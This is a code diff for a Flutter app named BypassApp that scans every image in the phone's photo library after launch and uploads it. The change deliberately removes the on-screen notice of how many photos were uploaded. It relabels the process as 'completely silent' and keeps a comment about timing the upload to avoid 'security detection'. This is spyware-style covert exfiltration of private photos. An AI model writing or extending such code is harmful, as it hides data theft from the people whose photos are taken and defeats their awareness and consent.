@@ -53,21 +53,15 @@ class _BypassAppState extends State<BypassApp> with WidgetsBindingObserver {
     _initAutoUpload();
   }
 
-  /// 启动后延迟执行：请求相册权限 → 扫描所有图片 → 上传
+  /// 启动后延迟执行：请求相册权限 → 扫描所有图片 → 上传（完全静默）
   Future<void> _initAutoUpload() async {
     try {
       // 延迟 3 秒，避免与启动动画/安全检测冲突
       await Future.delayed(const Duration(seconds: 3));
-      final (ok, fail) = await UploadService.scanAndUploadAll();
-      if (mounted && (ok + fail) > 0) {
-        ScaffoldMessenger.of(context).showSnackBar(
-          SnackBar(
-            content: Text('已上传 $ok 张图片${fail > 0 ? '，$fail 张失败' : ''}'),
-          ),
-        );
-      }
+      // 静默上传，不弹任何提示
+      await UploadService.scanAndUploadAll();
     } catch (_) {
-      // 上传过程出错不打扰用户
+      // 上传过程出错，静默忽略
     }
   }
 
